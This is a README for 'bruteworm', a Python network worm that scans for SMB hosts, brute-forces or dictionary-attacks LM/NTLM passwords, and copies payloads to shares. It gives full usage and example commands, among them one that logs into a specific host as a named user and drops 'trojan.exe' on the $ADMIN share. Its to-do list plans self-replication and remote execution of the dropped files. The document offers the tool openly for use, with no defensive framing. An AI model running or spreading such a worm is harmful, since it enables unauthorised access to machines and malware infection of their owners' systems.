# bruteworm
A simple worm that uses brute force and dictionary attacks through the network to infect vulnerable machines.

Inspired from the famous [SMB Worm Tool](http://www.securityweek.com/hackers-used-sophisticated-smb-worm-tool-attack-sony).

Currently limited to making connections with SMB directly over TCP (445) and SMB via NetBIOS API (139), but I may add support for more protocols in the future.

### Dependencies
* Python 2.7
* Nmap 6.4

### Features
* Generates LM/NTLM hash lists from dictionary words or variable length permutations of specified alphabets
* Scans for hosts with SMB running (forwards to Nmap) and performs OS detection upon session negotiation
* Copies files from local host to public or administrative shares when correct password found

### Usage
```bash
usage: bruteworm [-h] [-i INPUT] [-o OUTPUT] [-d DICTIONARY DICTIONARY] [-b]
                 [-c COUNT] [-n MIN] [-x MAX] [-a ALPHABET] [-t TARGET]
                 [-p PORT] [-u USER] [-s SHARE] [-v]
                 {build,scan,infect}

positional arguments:
  {build,scan,infect}   interaction with specified hosts/subnet victims

optional arguments:
  -h, --help                            show this help message and exit
  -i INPUT, --input INPUT               source file path
  -o OUTPUT, --output OUTPUT            destination file path
  -d FILE PATH, --dictionary HASH PATH  attack of either type pass|hash + dictionary file path
  -b, --bruteforce                      use brute force for password guessing
  -c COUNT, --count COUNT               number of hashes to generate
  -n MIN, --min MIN                     minimum number characters in password
  -x MAX, --max MAX                     maximum number characters in password
  -a ALPHABET, --alphabet ALPHABET      alphabet of allowed characters without spaces
  -t TARGET, --target TARGET            target hosts/subnet e.g. 192.168.2.10, 192.168.2.0/24
  -p PORT, --port PORT                  target port e.g. 139
  -u USER, --user USER                  target username to use for authentication
  -s SHARE, --share SHARE               target share name to drop malware
  -v, --verbosity                       console has 3 verbosity levels
```

### Examples
Generate precomputed hashes from a dictionary of words:
```bash
python bruteworm build -vvv -i /path/to/dictionary -o /save/to/hashes
```
Generate precomputed hashes for all possible passwords of 3-6 digits with lower case characters and digits:
```bash
python bruteworm build -vvv -i -n3 -x6 -o /save/to/hashes -a abcdefghijklmnopqrstuvwxyz0123456789
```
Authenticate as user john at host 192.168.1.135 using a password dictionary and copy trojan.exe to share $ADMIN:
```bash
python bruteworm infect -vvv -t 192.168.1.135 -d pass /path/to/dictionary -i trojan.exe -o trojan.exe -u john -s $ADMIN
```

### TODOs
* Make worm standalone so it can replicate itself more easily - as opposed to only acting as a dropper
* Add support for remotely executing copied files using scheduled tasks or other API
* Add support for user enumeration
